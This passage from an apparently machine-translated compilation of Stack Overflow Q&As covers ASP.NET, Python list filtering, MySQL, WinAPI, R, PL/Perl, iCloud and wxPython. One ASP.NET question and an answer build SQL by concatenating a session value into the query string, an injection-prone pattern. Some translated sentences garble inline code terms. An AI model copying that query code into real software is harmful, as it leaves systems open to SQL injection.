            if (JsonRequestBehavior == JsonRequestBehavior.DenyGet &&
                String.Equals(context.HttpContext.Request.HttpMethod, "GET", StringComparison.OrdinalIgnoreCase))
            {
                throw new InvalidOperationException(MvcResources.JsonRequest_GetNotAllowed);
            }

            HttpResponseBase response = context.HttpContext.Response;

            if (!String.IsNullOrEmpty(ContentType))
            {
                response.ContentType = ContentType;
            }
            else
            {
                response.ContentType = "application/json";
            }
            if (ContentEncoding != null)
            {
                response.ContentEncoding = ContentEncoding;
            }
            if (Data != null)
            {
                JavaScriptSerializer serializer = new JavaScriptSerializer();
                if (MaxJsonLength.HasValue)
                {
                    serializer.MaxJsonLength = MaxJsonLength.Value;
                }
                if (RecursionLimit.HasValue)
                {
                    serializer.RecursionLimit = RecursionLimit.Value;
                }
                response.Write(serializer.Serialize(Data));
            }
        } 
```

在这种情况下，它被添加是因为`WebGrease`它依赖于它。并且 MVC 中提供的捆绑和缩小服务`System.Web.Optimization`依赖于`WebGrease`.

因此，将安装一个没有 WebApi 的默认 MVC 应用`Newtonsoft.Json`程序用于捆绑和缩小服务而不是 WebApi。

要清楚`JsonResult`WebApi 返回的`System.Web.Http`确实`Newtonsoft.Json`用于它的序列化，如下所示：

```
using Newtonsoft.Json;
using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Web.Http;

namespace System.Web.Http.Results
{
  /// <summary>
  /// Represents an action result that returns an <see cref="F:System.Net.HttpStatusCode.OK"/> response with JSON data.
  /// </summary>
  /// <typeparam name="T">The type of content in the entity body.</typeparam>
  public class JsonResult<T> : IHttpActionResult 
```

但`Newtonsoft.Json`不包含在非 WebApi、默认 MVC 项目中，以防万一您可能决定使用某些 WebApi，它就在那里，因为如上所述，`WebGrease`需要它。不确定他们在 vNext 中做了什么，可能是`Newtonsoft.Json`.

# c# - 未触发的按钮数组的按钮单击事件

> ID：15738693
> 
> 赞同：0
> 
> 时间：2013-04-01T06:28:43.467
> 
> 标签：c#, asp.net

我认为这个问题已经被问过很多次了（我自己问过一次），但是我面临一个新问题。我正在创建一个按钮数组，点击我的应用程序中的另一个按钮。创建的按钮数量取决于我从数据库获得的值和从数据库获得的值取决于我在查询中传递的会话值。我的代码如下..

**代码**：

```
 protected void attributes()
    {
     SqlConnection con = new SqlConnection(ConfigurationManager.ConnectionStrings["constr"].ToString());
    SqlCommand cmd = new SqlCommand("select attributesequenceNumber as attsno,ProductCode as pcode, P26 as '" + 26 + "',P28 as '" + 28 + "',P30 as '" + 30 + "',P32 as '" + 32 + "',P34 as '"+34+"',P36 as '"+36+"',P38 as '"+38+"',P40 as '"+40+"',P42 as '"+42+"',SHXS as XS,SHS as S,SHM as M,SHL as L,SHXL as XL,SHXXL as XXL from tblattribute where ProductCode='" + Session["ImgProdCode"] + "'", con);
    //SqlCommand cmd = new SqlCommand("select Col.value('local-name(.)', 'varchar(Max)') as ColName from (select * from tblattribute where ProductCode ='"+Session["ImgProdCode"]+"' for xml path(''), type) as T(XMLCol) cross apply T.XMLCol.nodes('*') as n(Col) where Col.value('.', 'varchar(1)') = 1 " , con);
    try
    {
        con.Open();
        cmd.ExecuteNonQuery();
        DataTable dtble = new DataTable();
        SqlDataAdapter dap = new SqlDataAdapter(cmd);
        dap.Fill(dtble);
        if (dtble.Rows.Count > 0)
        {
           result = dtble.Columns.Cast<DataColumn>()
        .Where(c => c.ColumnName != "pcode" && c.ColumnName != "attsno")
        .Where(c => dtble.Rows[0][c].ToString() == "1")
        .Select(c => c.ColumnName)
        .ToList();
            res = result.Count;
            lbl = new Button[res];
            for(i=0; i<result.Count; i++)
            {

                lbl[i] = new Button();
                lbl[i].Text = result[i];
                lbl[i].ID = "btn" + i.ToString();
                lbl[i].Width = 30;
                lbl[i].Click+=new EventHandler(lbl_click);
                lbl[i].CssClass = "label";
                div1.Controls.Add(lbl[i]);
            }

        }

    }
    catch
    {
        throw;
    }
    finally
    {
        if (con != null)
        {
            con.Close();
        }
    }

} 

protected void lbl_click(object sender, EventArgs e)
{

    Button lbl = sender as Button;
    lbl.CssClass = "label1";

} 
```

上面的方法**attributes()**将在按钮单击时被调用，并且会话值也会在按钮单击时生成。经过研究，我知道动态按钮的创建应该在 page_init 事件中完成，但我不能在这里做。请帮忙解决这个问题..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T06:36:55.003

看看这里。

[http://blog.krisvandermast.com/AddingADynamicControlToAPlaceholderControlAndWireUpTheEvent.aspx](http://blog.krisvandermast.com/AddingADynamicControlToAPlaceholderControlAndWireUpTheEvent.aspx)

事件在那里，你只需要再次连接它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T05:51:51.203

您可以通过使用 jQuery 来实现这一点。
添加对网页的 jQuery 引用
获取适合类“标签”的所有控件，在其单击事件上调用服务器端的“lbl_click”方法。
确保“lbl_click”方法应标记为静态并使用 [webmethod] 进行修饰。

**页面**

```
<script src="http://code.jquery.com/jquery-1.9.1.min.js" type="text/javascript"></script>
<script type="text/javascript">
$(document).ready(function() {
//Find all controls that belongs to class '.label'
//on its click event call the server side function.
  $(".label").click(function(e) {
    $.ajax({
      type: "POST",
      url: "Default.aspx/lbl_click",
      data: "{}", //can pass parameter here, if required
      contentType: "application/json; charset=utf-8",
      dataType: "json",
      error:
      function(XMLHttpRequest, textStatus, errorThrown) {
        //Handle error here.
      },
      success:
      function(result) {
      //Set button css class to 'label1' using jQuery.
      }
    });
  });
});
</script>
</head> 
```

**代码背后**

```
 protected void attributes()
  {
   SqlConnection con = new 

SqlConnection(ConfigurationManager.ConnectionStrings["constr"].ToString());
    SqlCommand cmd = new SqlCommand("select attributesequenceNumber as attsno,ProductCode as pcode, P26 as '" + 26 + "',P28 as '" + 28 + "',P30 as '" + 30 + "',P32 as '" + 32 + "',P34 as '" + 34 + "',P36 as '" + 36 + "',P38 as '" + 38 + "',P40 as '" + 40 + "',P42 as '" + 42 + "',SHXS as XS,SHS as S,SHM as M,SHL as L,SHXL as XL,SHXXL as XXL from tblattribute where ProductCode='" + Session["ImgProdCode"] + "'", con);
    //SqlCommand cmd = new SqlCommand("select Col.value('local-name(.)', 'varchar(Max)') as ColName from (select * from tblattribute where ProductCode ='"+Session["ImgProdCode"]+"' for xml path(''), type) as T(XMLCol) cross apply T.XMLCol.nodes('*') as n(Col) where Col.value('.', 'varchar(1)') = 1 " , con);
try
{
  con.Open();
  cmd.ExecuteNonQuery();
  DataTable dtble = new DataTable();
  SqlDataAdapter dap = new SqlDataAdapter(cmd);
  dap.Fill(dtble);
  if (dtble.Rows.Count > 0)
  {
    result = dtble.Columns.Cast<DataColumn>()
 .Where(c => c.ColumnName != "pcode" && c.ColumnName != "attsno")
 .Where(c => dtble.Rows[0][c].ToString() == "1")
 .Select(c => c.ColumnName)
 .ToList();
    res = result.Count;
    lbl = new Button[res];
    for (i = 0; i < result.Count; i++)
    {

      lbl[i] = new Button();
      lbl[i].Text = result[i];
      lbl[i].ID = "btn" + i.ToString();
      lbl[i].Width = 30;
      //lbl[i].Click += new EventHandler(lbl_click);
      lbl[i].CssClass = "label";
      div1.Controls.Add(lbl[i]);
    }

  }

}
catch
{
  throw;
}
    finally
    {
      if (con != null)
      {
        con.Close();
      }
    }
  } 

  [WebMethod]
  public static string lbl_click()
  {
    return "label1";
  } 
```

希望这会帮助你。

# matlab - Data.c 文件生成

> ID：15738695
> 
> 赞同：0
> 
> 时间：2013-04-01T06:28:48.090
> 
> 标签：matlab, code-generation, simulink

我对matlab很陌生，我正在开发一个需要以下文件作为输入的软件，`model.c`用于特定的simulink模型。我有一个无法使用 RTW 生成文件的模型，我试图获取有关 RTW 生成的文件的一些信息，但我没有获得足够的信息。如果有人知道 RTW，请告诉我生成所需的块`model.h``model_data.c``model_data``model_data.c`

谢谢你

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T19:50:45.510

model_data.c 是一个有条件创建的文件（即仅在需要时才创建，这取决于为代码生成设置模型的方式）。

有关 Simulink Coder 构建过程以及生成什么文件的讨论，请在文档中搜索标题为“构建过程创建的文件和文件夹”的部分。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-08-05T06:43:53.890

对于将来需要帮助的其他人。打开`Configuration Parameters`窗格。转到`Code Generation -> Optimization`并确保将`Default parameter behavior`其设置为`Tunable`。

# python - 在 Python 中返回没有特定元素的列表的快速方法

> ID：15738700
> 
> 赞同：63
> 
> 时间：2013-04-01T06:29:25.240
> 
> 标签：python

如果我有一个任意顺序的卡片套装列表，如下所示：

```
suits = ["h", "c", "d", "s"] 
```

我想返回一个没有`'c'`

```
noclubs = ["h", "d", "s"] 
```

有没有一种简单的方法可以做到这一点？

* * *

## 回答 #1

> 赞同：61
> 
> 时间：2013-04-01T06:30:19.867

```
suits = ["h","c", "d", "s"]

noclubs = [x for x in suits if x != "c"] 
```

* * *

## 回答 #2

> 赞同：55
> 
> 时间：2013-04-01T06:30:35.480

```
>>> suits = ["h","c", "d", "s"]
>>> noclubs = list(suits)
>>> noclubs.remove("c")
>>> noclubs
['h', 'd', 's'] 
```

如果您不需要单独的`noclubs`

```
>>> suits = ["h","c", "d", "s"]
>>> suits.remove("c") 
```

* * *

## 回答 #3

> 赞同：36
> 
> 时间：2014-11-11T22:32:04.667

这个问题已经得到回答，但我想解决使用列表理解比使用慢得多的评论`.remove()`。

我机器上的一些配置文件（使用 Python 3.6.9的[笔记本）。](https://colab.research.google.com/drive/1CXcaouxktX196YpUorOsjTLLxUTLiq3W)

```
x = ['a', 'b', 'c', 'd']

%%timeit
y = x[:]  # fastest way to copy
y.remove('c')

1000000 loops, best of 3: 203 ns per loop

%%timeit
y = list(x)  # not as fast copy
y.remove('c')

1000000 loops, best of 3: 274 ns per loop

%%timeit
y = [n for n in x if n != 'c']  # list comprehension

1000000 loops, best of 3: 362 ns per loop

%%timeit
i = x.index('c')
y = x[:i] + x[i + 1:]

1000000 loops, best of 3: 375 ns per loop 
```

如果你使用最快的方法来复制一个列表（这不是很可读），你将比使用列表理解快 45%。但是，如果您使用`list()`类（更常见且 Pythonic）来复制列表，那么您将比使用列表理解慢 25%。

真的，一切都很快。我认为这个论点可以`.remove()`比列出列表理解技术更具可读性，但它不一定更快，除非你有兴趣放弃重复的可读性。

在这种情况下，列表理解的最大优点是它更加简洁（即，如果您有一个函数出于某种原因从给定列表中删除一个元素，则可以在 1 行中完成，而另一种方法则需要3 行。）有时单行非常方便（尽管它们通常以牺牲一些可读性为代价）。此外，当您实际上不知道要删除的元素是否实际上在开始的列表中时，使用列表推导会表现出色。虽然`.remove()`会抛出一个`ValueError`，但列表理解将按预期运行。

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2013-04-01T11:34:04.207

您可以使用过滤器（或来自 itertools 的 ifilter）

```
suits = ["h","c", "d", "s"]
noclubs = filter(lambda i: i!='c', suits) 
```

您还可以使用列表构造进行过滤

```
suits = ["h","c", "d", "s"]
noclubs = [ i for i in suits if i!='c' ] 
```

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2013-04-01T06:58:49.217

如果顺序*无关紧要*，可以使用集合操作：

```
suits = ["h", "c", "d", "s"]
noclubs = list(set(suits) - set(["c"]))
# note no order guarantee, the following is the result here:
# noclubs -> ['h', 's', 'd'] 
```

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2015-09-12T00:03:12.943

不使用 for 循环或 lambda 函数并保留顺序：

```
suits = ["h","c", "d", "s"]
noclubs = suits[:suits.index("c")]+suits[suits.index("c")+1:] 
```

我知道在内部它仍然会使用循环，但至少你不必在外部使用它们。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2017-08-06T19:53:53.927

一种可能性是使用[`filter`](https://docs.python.org/library/functions.html#filter)：

```
>>> import operator
>>> import functools

>>> suits = ["h", "c", "d", "s"]

>>> # Python 3.x
>>> list(filter(functools.partial(operator.ne, 'c'), suits))
['h', 'd', 's']

>>> # Python 2.x
>>> filter(functools.partial(operator.ne, 'c'), suits)
['h', 'd', 's'] 
```

而不是`partial`一个也可以使用这里的`__ne__`方法`'c'`：

```
>>> list(filter('c'.__ne__, suits))
['h', 'd', 's'] 
```

但是，后一种方法不被认为是非常 Pythonic（通常您不应该直接使用特殊方法 - 以双下划线开头），如果列表包含混合类型，它*可能会*产生奇怪的结果，但它可能比该`partial`方法快一点。

```
suits = ["h", "c", "d", "s"]*200   # more elements for more stable timings
%timeit list(filter('c'.__ne__, suits))
# 164 µs ± 5.98 µs per loop (mean ± std. dev. of 7 runs, 1000 loops each)
%timeit list(filter(functools.partial(operator.ne, 'c'), suits))
# 337 µs ± 13.3 µs per loop (mean ± std. dev. of 7 runs, 1000 loops each)
%timeit list(filter(lambda x: x != 'c', suits))
# 410 µs ± 13.7 µs per loop (mean ± std. dev. of 7 runs, 1000 loops each)
%timeit [x for x in suits if x != "c"]
181 µs ± 465 ns per loop (mean ± std. dev. of 7 runs, 1000 loops each) 
```

Python 3.5.2 使用 IPython 的魔法`%timeit`命令进行了测试。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2013-04-01T06:46:59.070

如果要删除*特定*元素（而不是仅过滤）很重要，则需要接近以下内容：

```
noclubs = [x for i, x in enumerate(suits) if i != suits.index('c')] 
```

`set`如果您的问题确实与扑克牌有关，您也可以考虑使用here 在语义上更正确。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2016-10-12T16:22:20.037

不幸的是，默认情况下，Python 中似乎没有这样的东西。

有几个答案，但我虽然会使用迭代器添加一个。如果可以接受就地更改，那将是最快的。如果您不想更改原始内容而只想遍历过滤集，这应该非常快：

执行：

```
def without(iterable, remove_indices):
    """
    Returns an iterable for a collection or iterable, which returns all items except the specified indices.
    """
    if not hasattr(remove_indices, '__iter__'):
        remove_indices = {remove_indices}
    else:
        remove_indices = set(remove_indices)
    for k, item in enumerate(iterable):
        if k in remove_indices:
            continue
        yield item 
```

用法：

```
li = list(range(5))
without(li, 3)             
# <generator object without at 0x7f6343b7c150>
list(without(li, (0, 2)))  
# [1, 3, 4]
list(without(li, 3))       
# [0, 1, 2, 4] 
```

所以它是一个生成器——你需要打电话`list`或其他东西让它永久化。

如果您只想删除单个索引，当然可以通过使用`k == remove_index`而不是集合来使其更快。

# mysql - 子查询结果多于一个值

> ID：15738707
> 
> 赞同：0
> 
> 时间：2013-04-01T06:29:49.187
> 
> 标签：mysql, subquery

我有两张桌子：

**table_people**

*   col_name
*   col_sex

**表性别**

*   col_male
*   col_female

假设`table_people`包含三行，***(a,'M'),(b,'M'),(c,'F')***。

现在我需要一个查询（子查询）在第二个表中插入第一个表值： ***(a,c),(b,'')***。

如果可以在mysql中？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T06:36:15.347

你的表结构不好。

我的建议是放弃`table_gender`，因为它根本没有意义。您已经在 table 上有一个具有性别的人员列表`table_people`。

`VIEW`如果您想单独列出性别，您可以生成一个, 。

```
CREATE VIEW MaleList
AS
SELECT col_name
FROM   table_people
WHERE  col_sex = 'M' 
```

以及仅针对女性列表的另一种视图。

```
CREATE VIEW FemaleList
AS
SELECT col_name
FROM   table_people
WHERE  col_sex = 'F' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T06:42:04.897

首先表结构不好。当您在 table_people 中 col_sex 时，我没有看到在另一个表中保存 M 或 F 的意义。如果你想这样做，首先你必须指定一个连接两个表的外键。

# mysql - 由于 utf-8 问题，Mysql 恢复失败

> ID：15738709
> 
> 赞同：0
> 
> 时间：2013-04-01T06:29:58.143
> 
> 标签：mysql, mysqldump, database-restore

这是我的猜测。恢复停止在出现 UTF-8 字符的行，这是一些非英语字符。所以把整个过程搞砸了。

我想通过我从另一个数据库转储的 SQL 文件来恢复数据库。另一个数据库使用全部 utf-8。见第二部分。

谁能告诉我考虑到这个问题的转储命令和恢复命令？

```
mysql> show variables like 'collation_%';
+----------------------+-----------------+
| Variable_name        | Value           |
+----------------------+-----------------+
| collation_connection | gbk_chinese_ci  |
| collation_database   | utf8_general_ci |
| collation_server     | gbk_chinese_ci  |
+----------------------+-----------------+
3 rows in set (0.02 sec)

mysql> show variables like 'character_set_%';
+--------------------------+----------------------------------------+
| Variable_name            | Value                                  |
+--------------------------+----------------------------------------+
| character_set_client     | gbk                                    |
| character_set_connection | gbk                                    |
| character_set_database   | utf8                                   |
| character_set_filesystem | binary                                 |
| character_set_results    | gbk                                    |
| character_set_server     | gbk                                    |
| character_set_system     | utf8                                   |
| character_sets_dir       | /usr/local/mysql/share/mysql/charsets/ |
+--------------------------+----------------------------------------+
8 rows in set (0.00 sec) 
```

服务器 SQL 转储文件来自：

```
mysql> show variables like 'character_set_%';
+--------------------------+----------------------------------+
| Variable_name            | Value                            |
+--------------------------+----------------------------------+
| character_set_client     | utf8                             |
| character_set_connection | utf8                             |
| character_set_database   | utf8                             |
| character_set_filesystem | binary                           |
| character_set_results    | utf8                             |
| character_set_server     | utf8                             |
| character_set_system     | utf8                             |
| character_sets_dir       | /usr/local/mysql/share/charsets/ |
+--------------------------+----------------------------------+
8 rows in set (0.00 sec)

mysql> show variables like 'collation_%';
+----------------------+-----------------+
| Variable_name        | Value           |
+----------------------+-----------------+
| collation_connection | utf8_general_ci |
| collation_database   | utf8_general_ci |
| collation_server     | utf8_general_ci |
+----------------------+-----------------+
3 rows in set (0.00 sec) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T06:34:28.407

使用phpmysql创建数据库时选择utf general，它应该可以完成这项工作，

# string - 如何在将输出存储在字符串中的 WinAPI 函数中将字符串转换为 LPSTR

> ID：15738715
> 
> 赞同：1
> 
> 时间：2013-04-01T06:30:26.987
> 
> 标签：string, winapi, visual-c++

我试图将一些内容存储到字符串变量中，方法是将其作为参数传递给各种类型的 Windows API 函数，这些函数接受 char * 之类的变量。

例如，我的代码是：-

```
std::string myString;
GetCurrentDirectoryA( MAX_PATH, myString ); 
```

现在如何在这种情况下将字符串变量转换为 LPSTR。

请注意，这个函数不是用来传递字符串的内容作为输入，而是函数在执行后将一些内容存储到字符串变量中。因此，排除了 myString.c_str( )。

编辑：我有一个解决方法，可以删除字符串的概念并将其替换为类似

```
char myString[ MAX_PATH ]; 
```

但这不是我的目标。我想使用字符串。有什么办法可以吗？

也像

```
GetCurrentDirectoryA( MAX_PATH, ( LPSTR ) myString ); 
```

不管用。

在此先感谢您的帮助。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-01T07:18:32.647

通常，人们重写他们需要`std::string`友好的 Windows 函数，如下所示：

```
std::string GetCurrentDirectoryA()
{
  char buffer[MAX_PATH];
  GetCurrentDirectoryA( MAX_PATH, buffer );
  return std::string(buffer);
} 
```

或者这个以获得广泛的字符支持：

```
std::wstring GetCurrentDirectoryW()
{
  wchar_t buffer[MAX_PATH];
  GetCurrentDirectoryW( MAX_PATH, buffer );
  return std::wstring(buffer);
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-01T06:41:42.077

`LPTSTR`被定义为`TCHAR*`，所以实际上它只是一个普通的 C 字符串，*但这*取决于您在代码中使用的是 ASCII 还是 Unicode。也一样

```
LPTSTR lpStr = new TCHAR[256];
ZeroMemory(lpStr, 256);
//fill the string using i.e. _tcscpy
const char* cpy = myString.c_str();
_tcscpy (lpStr, cpy);
//use lpStr 
```

请参阅[此处以获取有关](http://msdn.microsoft.com/de-de/library/kk6xf663(v=vs.80).aspx)[此](https://stackoverflow.com/questions/321413/lpcstr-lpctstr-and-lptstr)线程`_tcscpy`的参考。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T06:37:48.527

通常，我会将数据读入 TCHAR，然后将其复制到我的 std::string 中。这是最简单的方法。

# java - 通过 Facebook 应用集成集中登录的最佳方式是什么？在各种平台

> ID：15738717
> 
> 赞同：1
> 
> 时间：2013-04-01T06:30:37.067
> 
> 标签：java, android, ios, facebook, facebook-graph-api

目前我正在创建一个跨各种平台的产品，如 Android、IOS、Windows 8 和 Web（未来版本）

我正在努力创建一种方法来创建跨各种平台的集中登录 facebook。

例如：

如果我已经从我的 Android 手机上的 Facebook 帐户授权了我的 appA，那么当我拿起我的 iPad 时，我不想再次授权该应用程序。它应该知道同一个 FB 帐户已被授权一次，并且应该直接允许应用程序从 Facebook 获取所需的信息 - 我想如果我们分别使用 IOS 和 android 的 facebook sdk 是不可能的

现在，如果我通过托管的服务器处理所有 facebook 请求，可以说[http://zbcdef.com](http://zbcdef.com)并且我的所有客户都请求该服务器来获取与 facebook 相关的事务。在这种情况下，我的应用程序如何获取用户的信息用户登录应用程序时默认登录设备上的 facebook 应用程序（例如 quora 就可以），以及它如何影响移动营销活动分析

# r - 从滞后变量的加权和估计 R 中的参数

> ID：15738721
> 
> 赞同：0
> 
> 时间：2013-04-01T06:30:48.323
> 
> 标签：r, optimization, parameters, lag, estimation

恐怕我遇到了估计问题。

我有两个变量，X 和 Y。Y 由 X 的 n 个滞后值的加权和来解释。我的目标是估计以下两个参数 c(alpha0,alpha1)：

Yt = 从 j=1 到 n 的总和 ( ( alpha0 + alpha1 * j ) * Xt-j )

![在此处输入图像描述](https://i.stack.imgur.com/o1ypY.gif)

其中 Xt-j 表示 X 的第 j 个滞后。

我提出了这种方法，因为我认为估计权重的斜率而不是为每个添加的 X 滞后估计一个参数是一个好主意（我打算将 n 设置得非常大）。

模型噪声 ut 被添加，假设它是**正态分布**的，均值为 0，标准差为 sigma。

假设我想设置**n=510**，那么我需要原始系列和 510 滞后系列。为了避免系列中的任何 NA，我将原始数据转换为“data_chopped”，仅包含前 510 个观察值被删除后的观察值，以及矩阵“data_lagged”，其中每列代表一个滞后序列：

```
library(stats)
data<-arima.sim(n=10000,list(ar=0.15,ma=0.1),mean=0.5)

data_chopped<-data[511:length(data)]

data_lagged<-matrix(nrow=length(data_chopped),ncol=510)
for (i in 1:510){
data_lagged[,i]<-head(data,-i)[(511-i):length(head(data,-i))]
}

#Check result:
cbind(data_chopped,data_lagged[,1:3])
#data_lagged[,1] is the first lag of the original data, data_lagged[,2] is the second lag, and so on. No NAs whatsoever to deal with 
```

为了演示我的对数似然函数和生成的系列的“工作顺序”，我首先想拟合一个 AR(3) 模型：

```
logl<-function(sigma,alpha,beta,gamma){
-sum(log((1/(sqrt(2*pi)*sigma)) * exp(-((
data_chopped
-alpha*data_lagged[,1]
-beta*data_lagged[,2]
-gamma*data_lagged[,3]
)^2)/(2*sigma^2))))
}

library(stats4)
mle(logl,start=list(sigma=1,alpha=0,beta=0,gamma=0),method="L-BFGS-B") 
```

当我现在尝试以同样的方式估计我的模型时，它就不起作用了。我从来没有在对数似然函数中使用循环，这就是我刚刚写出上述模型的原因。所以，

Yt = 从 j=1 到 n 的总和 ( ( alpha0 + alpha1 * j ) * Xt-j )

= (alpha+beta*1)*Xt-1 + (alpha+beta*2)*Xt-2 + (alpha+beta*3)*Xt-3 + ... + (alpha+beta*510)*Xt -510

```
logl<-function(sigma,alpha,beta){
-sum(log((1/(sqrt(2*pi)*sigma)) * exp(-((
data_chopped
-(alpha + beta*1)*data_lagged[,1]
-(alpha + beta*2)*data_lagged[,2]
-(alpha + beta*3)*data_lagged[,3]
-(alpha + beta*4)*data_lagged[,4]
-(alpha + beta*5)*data_lagged[,5]
...
-(alpha + beta*510)*data_lagged[,510]
)^2)/(2*sigma^2))))
}

library(stats4)
mle(logl,start=list(sigma=1,alpha=0.5,beta=0),method="L-BFGS-B")
Error in optim(start, f, method = method, hessian = TRUE, ...) : 
L-BFGS-B needs finite values of 'fn' 
```

如果我只尝试几行，我不会收到错误：

```
logl<-function(sigma,alpha,beta){
-sum(log((1/(sqrt(2*pi)*sigma)) * exp(-((
data_chopped
-(alpha + beta*1)*data_lagged[,1]
-(alpha + beta*2)*data_lagged[,2]
-(alpha + beta*3)*data_lagged[,3]
-(alpha + beta*4)*data_lagged[,4]
-(alpha + beta*5)*data_lagged[,5]
)^2)/(2*sigma^2))))
}

library(stats4)
mle(logl,start=list(sigma=1,alpha=0.5,beta=0),method="L-BFGS-B")
Call:
mle(minuslogl = logl, start = list(sigma = 1, alpha = 0.5, beta = 0), 
method = "L-BFGS-B")

Coefficients:
 sigma      alpha       beta 
1.07797708  0.26178848 -0.04378526 
```

有人可以帮我解决这个问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T00:43:39.783

我会回应不使用该`lag`功能的建议。它的作者和早期用户可能知道它的作用，但我们其他人在它没有达到预期的情况下有过糟糕的体验。我发现这个`embed`函数对我认为 lag 函数应该做的事情很有用。

```
> embed(1:8, 3)
     [,1] [,2] [,3]
[1,]    3    2    1
[2,]    4    3    2
[3,]    5    4    3
[4,]    6    5    4
[5,]    7    6    5
[6,]    8    7    6 
```

假设您想回顾当前时间之前的 6 次并按行进行计算。您需要接受并计划这样一个事实，即现在应该对第 1-6 期做什么是模棱两可的，因为它们将有不完整的数据。我无法从您的公式中弄清楚，当您有两个以上的滞后期时，如何仅估计两个参数，除非您将某些特定形状应用于磨损现象......也许是线性的......你没有说。

```
dfrm <- data.frame(y=rnorm(20), x=rnorm(20) )
dfrm$embx<- matrix(NA, ncol=7, nrow=20)
dfrm$embx[7:20, ] <- embed(dfrm$x, 7) * rep( (7:1)/7, each=14)
lm( y[7:20] ~ embx[7:20,], data=dfrm )

Call:
lm(formula = y[7:20] ~ embx[7:20, ], data = dfrm)

Coefficients:
  (Intercept)  embx[7:20, ]1  embx[7:20, ]2  embx[7:20, ]3  embx[7:20, ]4  embx[7:20, ]5  
       0.3065        -0.2371         0.9504         0.8601         0.5484         0.6621  
embx[7:20, ]6  embx[7:20, ]7  
       1.1619         4.8338 
```

这使用“全强度” x_t 并将 x_(t-7) 的强度降低到 1/7。这与你的公式表达的有点不同，因为它没有 x_t 协变量，但你应该能够从估计的系数中构造一个“斜率”。

# linux - 如何在 postgres-8.4 触发器中调试 plperl 脚本

> ID：15738722
> 
> 赞同：0
> 
> 时间：2013-04-01T06:30:51.297
> 
> 标签：linux, postgresql, triggers, plperl

我正在为触发器执行编写 plperl 脚本函数。当 INSERT / UPDATE 发生时，我的 plperl 脚本将运行，因为我正在根据收到的事件动态形成一些查询。当我插入/更新时，我想在终端中打印它。但它不会发生。告诉我我可以用哪种方式打印它。？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T07:19:48.907

使用[elog](http://www.postgresql.org/docs/8.4/static/plperl-database.html)功能发出通知。您还可以使用它来引发完整的错误。

# objective-c - 防止 iCloud 窗口在 OSX 10.8 应用启动时打开

> ID：15738724
> 
> 赞同：11
> 
> 时间：2013-04-01T06:30:53.210
> 
> 标签：objective-c, xcode, cocoa, osx-mountain-lion, icloud

我编写了一个使用 iCloud 文档存储的 OSX 应用程序。每当我在 Mountain Lion（而不是 Lion）中打开它时，会打开一个 iCloud 窗口，如下所示：

![在此处输入图像描述](https://i.stack.imgur.com/ZDedQ.png)

有没有办法防止这种情况在发布时发生？

**更新：**

1）`applicationShouldOpenUntitledFile:`没有被调用（是的，我确定我在听我的委托
。2）如果我强制退出应用程序，下次打开时，我不会得到对话框。但是，如果我通过正常的退出过程，它确实会出现。

**更新 2（也作为答案添加，以帮助将来可能偶然发现此问题的人）：**来自重复问题 的`applicationShouldOpenUntitledFile:`问题不起作用。经过大量实验，我发现如果我`NSDocumentClass`从数组中的 Info.plist 中删除键和值`CFBundleDocumentTypes`，则不再打开窗口。我也将该答案添加到了重复的问题中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2018-01-19T22:03:06.780

在您的 App Delegate 中放置以下代码可以让您绕过 iCloud 弹出的新文档屏幕。经过高山脉测试。

```
-(void)applicationDidFinishLaunching:(NSNotification *)notification
{
    // Schedule "Checking whether document exists." into next UI Loop.
    // Because document is not restored yet. 
    // So we don't know what do we have to create new one.
    // Opened document can be identified here. (double click document file)
    NSInvocationOperation* op = [[NSInvocationOperation alloc]initWithTarget:self selector:@selector(openNewDocumentIfNeeded) object:nil];
    [[NSOperationQueue mainQueue] addOperation: op];
}

-(void)openNewDocumentIfNeeded
{
    NSUInteger documentCount = [[[NSDocumentController sharedDocumentController] documents]count];

    // Open an untitled document what if there is no document. (restored, opened).       
    if(documentCount == 0){
        [[NSDocumentController sharedDocumentController]openUntitledDocumentAndDisplay:YES error: nil];
    }
} 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-05-26T04:28:08.793

从iCloud 启用 - 停止在应用程序启动`applicationShouldOpenUntitledFile:`时[显示打开的文件？](https://stackoverflow.com/questions/13825228/icloud-enabled-stop-the-open-file-displaying-on-application-launch?rq=1)没有工作。经过大量实验，我发现如果我从数组中删除键`NSDocumentClass`和值，窗口将不再打开。`Info.plist``CFBundleDocumentTypes`

# python - 在 Wx TxtCtrl 中出现错误

> ID：15738725
> 
> 赞同：0
> 
> 时间：2013-04-01T06:31:00.953
> 
> 标签：python, wxpython, wxtextctrl

我正在使用马拉雅拉姆语文本编辑器。我需要在按钮单击时使用 WxPython 中的文本控件加粗选定的文本。工作环境是 Ubuntu 10.04 和 WxPython 2.8。

这是我的代码：

```
import wx

class TestFrame(wx.Frame):
    def __init__(self, *args, **kwargs):
        super(TestFrame, self).__init__(*args, **kwargs)

        panel = wx.Panel(self)

        text = 'Highlight some text and then click the button below'

        self.textctrl = wx.TextCtrl(panel, value=text, style=wx.TE_RICH2,
                                    size=(300, -1))

        btn = wx.Button(panel, wx.ID_BOLD)
        btn.Bind(wx.EVT_BUTTON, self.on_bold)

        pSizer = wx.BoxSizer(wx.VERTICAL)
        pSizer.Add(self.textctrl, 0, wx.ALL, 5)
        pSizer.Add(btn, 0, wx.ALL, 5)
        panel.SetSizer(pSizer)

